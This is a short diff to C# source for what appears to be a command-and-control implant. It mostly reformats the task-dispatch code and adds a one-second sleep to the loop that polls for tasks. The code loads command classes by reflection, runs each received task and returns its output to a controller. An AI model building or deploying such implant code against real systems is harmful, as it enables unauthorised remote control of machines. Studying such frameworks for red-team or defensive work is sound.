@@ -42,25 +42,18 @@ namespace Implant
         public static void HandleTask(ImplantTask task) {
             var command = _commands.FirstOrDefault(cmd => cmd.Name.Equals(task.Command, StringComparison.InvariantCultureIgnoreCase));
             if (command is null) { return; }
-            try
-            {
+
+            try {
                 var _out = command.Execute(task);
                 SendTaskOut(task, task.Id, _out);
-            } catch (Exception e) { 
-                SendTaskOut(task, task.Id, e.Message);
-            }
+            } catch (Exception e) { SendTaskOut(task, task.Id, e.Message); }
         }
 
-        public static void HandleTasks(IEnumerable<ImplantTask> tasks) {
-            foreach (var task in tasks) { HandleTask(task); }
-        }
+        public static void HandleTasks(IEnumerable<ImplantTask> tasks) { foreach (var task in tasks) { HandleTask(task); } }
 
-        public static void ImplantCommandsInit()
-        {
-            foreach (Type type in Assembly.GetExecutingAssembly().GetTypes())
-            {
-                if (type.IsSubclassOf(typeof(ImplantCommands)))
-                {
+        public static void ImplantCommandsInit() {
+            foreach (Type type in Assembly.GetExecutingAssembly().GetTypes()) {
+                if (type.IsSubclassOf(typeof(ImplantCommands))) {
                     ImplantCommands cmd = Activator.CreateInstance(type) as ImplantCommands;
                     _commands.Add(cmd);
                 }
@@ -83,6 +76,7 @@ namespace Implant
             _cancelToken = new CancellationTokenSource();
 
             while (!_cancelToken.IsCancellationRequested) {
+                Thread.Sleep(1000);
                 if (_comms.DataRecv(out var tasks)) { HandleTasks(tasks); }
             }
         }
